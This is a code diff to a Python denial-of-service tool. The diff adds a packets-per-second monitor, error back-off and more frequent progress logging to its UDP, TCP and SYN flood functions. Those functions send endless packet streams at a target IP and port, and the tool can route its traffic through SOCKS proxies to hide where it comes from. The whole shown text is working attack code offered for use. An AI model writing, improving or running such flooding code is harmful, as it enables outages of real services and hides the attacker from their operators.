@@ -17,18 +17,16 @@ CYAN = "\033[96m"
 proxies = []
 use_proxy = False
 proxy_type = socks.SOCKS5
+pps_counter = [0]
 
 
 def generate_payload(size, mode="random"):
     if mode == "null":
         return b"\x00" * size
     elif mode == "text":
-        return b"A" * size
+        return ("A" * size).encode()
     elif mode == "ascii":
-        buf = bytearray(size)
-        for i in range(size):
-            buf[i] = random.randint(33, 126)
-        return bytes(buf)
+        return "".join([chr(random.randint(33, 126)) for _ in range(size)]).encode()
     else:
         return random._urandom(size)
 
@@ -52,18 +50,27 @@ def get_socket_with_proxy():
     return sock
 
 
+def pps_monitor():
+    while True:
+        time.sleep(1)
+        print(f"{CYAN}[{timestamp()}] PPS: {pps_counter[0]}{RESET}")
+        pps_counter[0] = 0
+
+
 def udp_flood(target_ip, target_port, packet_size, thread_id, payload_mode):
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     payload = generate_payload(packet_size, payload_mode)
     sent = 0
+    delay = 0
     while True:
         try:
             sock.sendto(payload, (target_ip, target_port))
             sent += 1
-            if sent % 100000 == 0:
-                print(f"{CYAN}[{timestamp()}][UDP-{thread_id}] Packets: {sent}{RESET}")
+            pps_counter[0] += 1
         except Exception as e:
-            pass
+            print(f"{RED}[UDP-{thread_id}] Error: {e}{RESET}")
+            time.sleep(delay)
+            delay = min(0.1, delay + 0.001)
 
 
 def tcp_flood(target_ip, target_port, packet_size, thread_id, payload_mode):
@@ -78,13 +85,14 @@ def tcp_flood(target_ip, target_port, packet_size, thread_id, payload_mode):
             for _ in range(10):
                 sock.send(payload)
                 sent += 1
-                if sent % 10000 == 0:
+                if sent % 1000 == 0:
                     print(
                         f"{YELLOW}[{timestamp()}][TCP-{thread_id}] Packets: {sent}{RESET}"
                     )
             sock.close()
         except Exception as e:
             print(f"{RED}[TCP-{thread_id}] Error: {e}{RESET}")
+            time.sleep(0.05)
 
 
 def syn_flood(target_ip, target_port, thread_id):
@@ -99,13 +107,14 @@ def syn_flood(target_ip, target_port, thread_id):
             packet = b"\x00" * 60
             sock.sendto(packet, (target_ip, target_port))
             sent += 1
-            if sent % 10000 == 0:
+            if sent % 100 == 0:
                 print(f"{GREEN}[{timestamp()}][SYN-{thread_id}] Packets: {sent}{RESET}")
         except PermissionError:
             print(f"{RED}[SYN-{thread_id}] Root required!{RESET}")
             return
         except Exception as e:
             print(f"{RED}[SYN-{thread_id}] Error: {e}{RESET}")
+            time.sleep(0.1)
 
 
 def check_latency(ip, port):
@@ -161,6 +170,7 @@ def main():
                 proxy_type = socks.SOCKS5
 
     load_proxies()
+    threading.Thread(target=pps_monitor, daemon=True).start()
 
     print(f"{CYAN}[*] Target: {target_ip}:{target_port}{RESET}")
     print(
